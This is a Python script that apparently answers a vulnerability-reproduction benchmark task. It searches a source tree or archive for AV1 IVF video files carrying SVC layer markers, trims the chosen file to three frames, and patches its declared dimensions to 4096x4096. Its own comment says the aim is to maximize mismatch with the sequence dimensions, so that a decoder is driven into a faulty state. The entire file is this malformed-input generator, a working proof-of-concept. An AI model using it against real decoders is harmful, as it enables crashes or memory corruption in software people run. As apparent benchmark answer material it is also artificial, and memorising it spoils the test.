import os
import tarfile
import zipfile
from typing import Iterator, Optional, Tuple, List


def _read_file_from_fs(path: str, max_size: int) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if st.st_size <= 0 or st.st_size > max_size:
            return None
        with open(path, "rb") as f:
            return f.read()
    except Exception:
        return None


def _iter_source_files(src_path: str, max_size: int = 5_000_000) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                data = _read_file_from_fs(p, max_size)
                if data is not None:
                    yield p, data
        return

    if tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    if m.size <= 0 or m.size > max_size:
                        continue
                    name = m.name
                    low = name.lower()
                    if not (low.endswith(".ivf") or low.endswith(".bin") or low.endswith(".obu") or low.endswith(".av1") or "svc" in low):
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if data:
                        yield name, data
        except Exception:
            pass
        return

    if zipfile.is_zipfile(src_path):
        try:
            with zipfile.ZipFile(src_path, "r") as zf:
                for info in zf.infolist():
                    if info.is_dir():
                        continue
                    if info.file_size <= 0 or info.file_size > max_size:
                        continue
                    name = info.filename
                    low = name.lower()
                    if not (low.endswith(".ivf") or low.endswith(".bin") or low.endswith(".obu") or low.endswith(".av1") or "svc" in low):
                        continue
                    try:
                        data = zf.read(info)
                    except Exception:
                        continue
                    if data:
                        yield name, data
        except Exception:
            pass
        return

    data = _read_file_from_fs(src_path, max_size)
    if data is not None:
        yield src_path, data


def _le32(b: bytes, off: int) -> int:
    return b[off] | (b[off + 1] << 8) | (b[off + 2] << 16) | (b[off + 3] << 24)


def _read_leb128(data: bytes, pos: int, limit: int) -> Tuple[Optional[int], int]:
    v = 0
    shift = 0
    start = pos
    while pos < limit and pos - start < 8:
        b = data[pos]
        pos += 1
        v |= (b & 0x7F) << shift
        if (b & 0x80) == 0:
            return v, pos - start
        shift += 7
    return None, 0


def _is_ivf_av1(data: bytes) -> bool:
    if len(data) < 32:
        return False
    if data[:4] != b"DKIF":
        return False
    fourcc = data[8:12]
    if fourcc not in (b"AV01", b"AV1 ", b"av01", b"av1 "):
        return False
    hdr_len = int.from_bytes(data[6:8], "little", signed=False)
    if hdr_len != 32:
        return False
    return True


def _scan_frame_for_svc_markers(frame: bytes) -> bool:
    n = len(frame)
    pos = 0
    it = 0
    while pos < n and it < 500:
        it += 1
        if pos >= n:
            break
        h = frame[pos]
        pos += 1
        if (h & 0x80) != 0:
            return False
        obu_type = (h >> 3) & 0x0F
        ext_flag = (h & 0x04) != 0
        has_size = (h & 0x02) != 0
        if ext_flag:
            if pos >= n:
                return True
            ext = frame[pos]
            pos += 1
            temporal_id = (ext >> 5) & 0x7
            spatial_id = (ext >> 3) & 0x3
            if temporal_id != 0 or spatial_id != 0:
                return True
            return True
        if not has_size:
            # Can't reliably parse further, but this is uncommon in IVF. Don't over-classify.
            return False
        obu_size, consumed = _read_leb128(frame, pos, n)
        if obu_size is None or consumed <= 0:
            return False
        pos += consumed
        if pos + obu_size > n:
            return False
        payload = frame[pos:pos + obu_size]
        if obu_type == 5 and payload:
            mt, mcons = _read_leb128(payload, 0, len(payload))
            if mt is not None and mt == 3:
                return True
        pos += obu_size
    return False


def _detect_svc_in_ivf(data: bytes, max_frames: int = 5) -> bool:
    if not _is_ivf_av1(data):
        return False
    off = 32
    frames = 0
    n = len(data)
    while off + 12 <= n and frames < max_frames:
        sz = _le32(data, off)
        off += 12
        if sz <= 0 or off + sz > n:
            break
        frame = data[off:off + sz]
        if _scan_frame_for_svc_markers(frame):
            return True
        off += sz
        frames += 1
    return False


def _trim_ivf(data: bytes, keep_frames: int = 3) -> bytes:
    if not _is_ivf_av1(data):
        return data
    n = len(data)
    off = 32
    frames = 0
    out = bytearray()
    out.extend(data[:32])
    while off + 12 <= n and frames < keep_frames:
        sz = _le32(data, off)
        if sz <= 0:
            break
        if off + 12 + sz > n:
            break
        out.extend(data[off:off + 12 + sz])
        off += 12 + sz
        frames += 1
    if frames == 0:
        return data
    out[24:28] = int(frames).to_bytes(4, "little", signed=False)
    return bytes(out)


def _patch_ivf_dims(data: bytes, w: int, h: int) -> bytes:
    if not _is_ivf_av1(data):
        return data
    w = max(1, min(65535, int(w)))
    h = max(1, min(65535, int(h)))
    out = bytearray(data)
    out[12:14] = w.to_bytes(2, "little", signed=False)
    out[14:16] = h.to_bytes(2, "little", signed=False)
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidates: List[Tuple[int, int, str, bytes]] = []

        for name, data in _iter_source_files(src_path):
            if not _is_ivf_av1(data):
                continue
            svc = _detect_svc_in_ivf(data, max_frames=8)
            pri = 0 if svc else 1
            candidates.append((pri, len(data), name, data))

        if not candidates:
            # Fallback: smallest IVF-looking AV1 file from any file, without extension filtering
            for name, data in _iter_source_files(src_path):
                if _is_ivf_av1(data):
                    svc = _detect_svc_in_ivf(data, max_frames=8)
                    pri = 0 if svc else 1
                    candidates.append((pri, len(data), name, data))
            if not candidates:
                return b"DKIF\x00\x00\x20\x00AV01\x01\x00\x01\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        candidates.sort(key=lambda x: (x[0], x[1]))
        data = candidates[0][3]

        data = _trim_ivf(data, keep_frames=3)

        # Inflate declared display dimensions to maximize mismatch with subset sequence dimensions.
        data = _patch_ivf_dims(data, 4096, 4096)

        return data